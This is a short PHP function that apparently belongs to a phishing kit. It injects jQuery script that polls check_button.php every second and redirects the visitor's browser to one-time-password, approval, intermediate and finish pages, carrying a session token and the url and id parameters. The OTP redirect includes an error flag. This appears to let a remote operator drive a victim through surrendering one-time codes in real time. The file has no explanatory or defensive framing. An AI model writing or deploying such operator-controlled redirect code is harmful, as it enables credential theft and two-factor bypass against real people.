<?php
function control($url=null, $id=null) {
    $length = 40; // Desired length of the random string
    $randomBytes = random_bytes($length);
    $randomString = bin2hex($randomBytes);
    echo "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
   <script>
        $(document).ready(function () {
            var session = '".$randomString."';
            var url = '".$url."';
            var id = '".$id."';
            function checkButtonStatus() {
                $.ajax({
                    url: 'check_button.php',
                    type: 'GET',
                    cache: false, // Disable caching
                    success: function (response) {
                        if (response === 'button1') {
                            window.location.href = 'C.php?stp=otp&session='+session+'&u='+url+'&d='+id+'&err=false';
                        } else if (response === 'button2') {
                            window.location.href = 'C.php?stp=otp&session='+session+'&u='+url+'&d='+id+'&err=true';
                        } else if (response === 'button3') {
                            window.location.href = 'approve.php?stp=app&session='+session;
                        } else if (response === 'button4') {
                            window.location.href = 'B.php?stp=s3&session='+session;
                        }
                        else if (response === 'button5') {
                            window.location.href = 'finish.php?stp=last&session='+session;
                        }
                    }
                });
            }

            setInterval(checkButtonStatus, 1000); // Check button status every second
        });
    </script>";
}
?>
